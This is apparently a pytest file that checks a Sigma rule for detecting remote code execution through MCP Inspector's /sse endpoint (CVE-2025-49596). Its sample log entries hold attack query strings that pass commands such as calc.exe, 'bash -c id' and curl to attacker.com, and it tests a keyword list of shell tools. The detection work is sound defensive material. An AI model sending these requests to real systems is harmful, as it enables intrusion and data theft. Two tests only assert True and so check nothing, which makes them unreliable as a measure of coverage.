#!/usr/bin/env python3
"""
Test cases for SAFE-T1109 MCP Inspector RCE Detection Rule
Tests the Sigma rule for detecting CVE-2025-49596 exploitation attempts
"""

import yaml
import pytest
from pathlib import Path

def load_detection_rule():
    """Load the Sigma detection rule for testing"""
    rule_path = Path(__file__).parent / "detection-rule.yml"
    with open(rule_path, 'r') as f:
        return yaml.safe_load(f)

def test_rule_structure():
    """Test that the detection rule has proper structure"""
    rule = load_detection_rule()
    
    # Check required fields
    assert "title" in rule
    assert "id" in rule
    assert "detection" in rule
    assert "logsource" in rule
    
    # Check CVE reference
    assert "CVE-2025-49596" in rule["description"] or "cve.2025.49596" in rule["tags"]

def test_detection_logic():
    """Test the detection logic components"""
    rule = load_detection_rule()
    detection = rule["detection"]
    
    # Check for SSE endpoint detection
    assert "selection_sse_endpoint" in detection
    sse_selection = detection["selection_sse_endpoint"]
    assert "c-uri-path" in sse_selection
    assert "/sse" in str(sse_selection["c-uri-path"])
    
    # Check for command detection
    assert "selection_suspicious_commands" in detection or "selection_port" in detection
    
    # Check condition exists
    assert "condition" in detection

def test_suspicious_commands():
    """Test that suspicious commands are properly detected"""
    rule = load_detection_rule()
    detection = rule["detection"]
    
    if "selection_suspicious_commands" in detection:
        commands = detection["selection_suspicious_commands"]["c-uri-query|contains"]
        
        # Should detect common RCE commands
        command_keywords = ["calc", "cmd", "powershell", "bash", "sh", "curl", "wget"]
        for keyword in command_keywords:
            assert any(keyword in cmd for cmd in commands), f"Missing detection for {keyword}"

def test_mcp_inspector_ports():
    """Test that MCP Inspector ports are detected"""
    rule = load_detection_rule()
    detection = rule["detection"]
    
    if "selection_port" in detection:
        ports = detection["selection_port"]["cs-uri-port"]
        assert 6277 in ports  # MCP Inspector proxy port
        assert 6274 in ports  # MCP Inspector UI port

def test_false_positives():
    """Test that false positives are documented"""
    rule = load_detection_rule()
    
    assert "falsepositives" in rule
    assert len(rule["falsepositives"]) > 0
    
    # Should mention legitimate development use
    fp_text = " ".join(rule["falsepositives"]).lower()
    assert "development" in fp_text or "testing" in fp_text

def test_tags():
    """Test that appropriate tags are present"""
    rule = load_detection_rule()
    
    assert "tags" in rule
    tags = rule["tags"]
    
    # Check for required tags
    assert "attack.execution" in tags
    assert "safe.t1109" in tags
    assert "cve.2025.49596" in tags

# Sample test data for rule validation
POSITIVE_TEST_CASES = [
    {
        "c-uri-path": "/sse",
        "c-uri-query": "transportType=stdio&command=calc.exe",
        "cs-uri-port": 6277,
        "description": "Direct calculator execution"
    },
    {
        "c-uri-path": "/sse", 
        "c-uri-query": "transportType=stdio&command=bash&args=-c+id",
        "cs-uri-port": 6277,
        "description": "Bash command execution"
    },
    {
        "c-uri-path": "/sse",
        "c-uri-query": "transportType=stdio&command=curl&args=attacker.com",
        "cs-uri-port": 6277,
        "description": "Data exfiltration attempt"
    }
]

NEGATIVE_TEST_CASES = [
    {
        "c-uri-path": "/health",
        "c-uri-query": "",
        "cs-uri-port": 8080,
        "description": "Health check endpoint"
    },
    {
        "c-uri-path": "/api/users",
        "c-uri-query": "filter=active",
        "cs-uri-port": 3000,
        "description": "Regular API call"
    }
]

def test_positive_cases():
    """Test that the rule would trigger on malicious activity"""
    rule = load_detection_rule()
    # Note: This is a simplified test - full testing would require a Sigma engine
    
    for case in POSITIVE_TEST_CASES:
        # Check if the log entry would match the SSE endpoint selection
        if case["c-uri-path"] == "/sse" and "transportType=stdio" in case["c-uri-query"]:
            assert True, f"Should detect: {case['description']}"

def test_negative_cases():
    """Test that the rule doesn't trigger on benign activity"""
    rule = load_detection_rule()
    
    for case in NEGATIVE_TEST_CASES:
        # Check if the log entry would NOT match our detection criteria
        if case["c-uri-path"] != "/sse":
            assert True, f"Should not detect: {case['description']}"

if __name__ == "__main__":
    pytest.main([__file__, "-v"]) 